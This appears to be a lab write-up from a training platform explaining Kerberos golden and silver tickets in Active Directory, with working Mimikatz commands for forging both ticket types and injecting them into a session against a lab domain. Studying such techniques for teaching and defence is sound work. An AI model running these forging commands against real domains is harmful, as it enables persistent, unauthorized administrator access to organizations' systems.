# Golden and Silver Tickets in Active Directory

As discussed in previous tasks, attackers often seek persistence through service accounts with delegation permissions to forge silver and golden tickets. But what are these tickets, and why does every blue team tabletop exercise end with someone shouting: "Flush all golden and silver tickets!"?

---

## Kerberos Authentication Recap

Before diving into golden and silver tickets, let's quickly recap Kerberos authentication:

1. **AS-REQ**: The user requests a Ticket Granting Ticket (TGT) from the Key Distribution Centre (KDC) on the Domain Controller (DC), including a timestamp encrypted with the user's NTLM hash.
2. **TGT Issuance**: The DC verifies the request and sends back a TGT, signed with the KRBTGT account's password hash (stored only on the DC).
3. **TGS Request**: The user presents the TGT to the DC to request a Ticket Granting Service (TGS) ticket for a specific resource.
4. **TGS Issuance**: If the TGT is valid, the DC issues a TGS, encrypted with the NTLM hash of the target service.
5. **Service Access**: The user presents the TGS to the service, which verifies it and grants access.

---

## Golden Tickets

**Golden Tickets** are forged TGTs. By forging a TGT, an attacker bypasses the initial authentication steps and can request TGS tickets for almost any service.

**Key Points:**
- **KRBTGT Hash Required**: To forge a golden ticket, the KRBTGT account's password hash is needed.
- **Bypass Account Verification**: The TGT is only checked for a valid signature, not for the existence of the user.
- **Customizable Ticket Contents**: Attackers can set arbitrary validity periods (e.g., 10 years).
- **Persistence**: The KRBTGT password rarely changes, so access can persist indefinitely unless the password is rotated twice.
- **Detection and Mitigation**: Rotating the KRBTGT password is disruptive and must be done twice to invalidate all tickets.
- **Bypass Smart Cards**: Golden tickets can bypass smart card authentication.
- **No Domain Join Needed**: Tickets can be generated on any machine.
- **Required Information**: KRBTGT hash, domain name, domain SID, and user RID.

---

## Silver Tickets

**Silver Tickets** are forged TGS tickets for specific services on specific hosts.

**Key Points:**
- **Machine Account Hash Required**: The TGS is signed with the target machine account's hash.
- **Limited Scope**: Access is limited to the targeted host/service.
- **Stealthier**: The DC is never contacted, so detection is harder (logs only on the target server).
- **Custom SIDs**: Attackers can create tickets for non-existent users with relevant SIDs.
- **Persistence**: Machine account passwords rotate every 30 days by default, but this can be disabled for persistence.
- **Further Exploitation**: Machine accounts can be used for further AD enumeration and exploitation.

---

## Forging Tickets with Mimikatz

### Required Information

- **KRBTGT NTLM hash** (for golden tickets)
- **Machine account NTLM hash** (for silver tickets)
- **Domain SID**
- **Domain name**
- **User RID** (typically 500 for Administrator)

You can retrieve the Domain SID using PowerShell:

```powershell
Get-ADDomain
```

Example output:

```
DomainSID : S-1-5-21-3885271727-2693558621-2658995185
```

---

### Generating a Golden Ticket

Launch Mimikatz and run:

```plaintext
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<KRBTGT NTLM hash> /endin:600 /renewmax:10080 /ptt
```

**Parameters:**
- `/admin`: Username to impersonate (does not need to exist)
- `/domain`: FQDN of the domain
- `/id`: User RID (500 = Administrator)
- `/sid`: Domain SID
- `/krbtgt`: KRBTGT NTLM hash
- `/endin`: Ticket lifetime (minutes)
- `/renewmax`: Maximum renewal period (minutes)
- `/ptt`: Injects the ticket into the current session

**Verification:**

```plaintext
dir \\thmdc.za.tryhackme.loc\c$\
```

---

### Generating a Silver Ticket

Run the following in Mimikatz:

```plaintext
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Target Hostname> /rc4:<Machine Account NTLM hash> /service:cifs /ptt
```

**Parameters:**
- `/target`: Hostname of the target server (e.g., THMSERVER1.za.tryhackme.loc)
- `/rc4`: NTLM hash of the machine account (e.g., THMSERVER1$)
- `/service`: Service to access (e.g., cifs for file access)

**Verification:**

```plaintext
dir \\thmserver1.za.tryhackme.loc\c$\
```

---

## Summary

Golden and silver tickets provide powerful persistence mechanisms in Active Directory environments. Golden tickets grant broad access and are easier to detect and remediate, while silver tickets are stealthier and harder to defend against. Proper password rotation and monitoring are essential for defense.

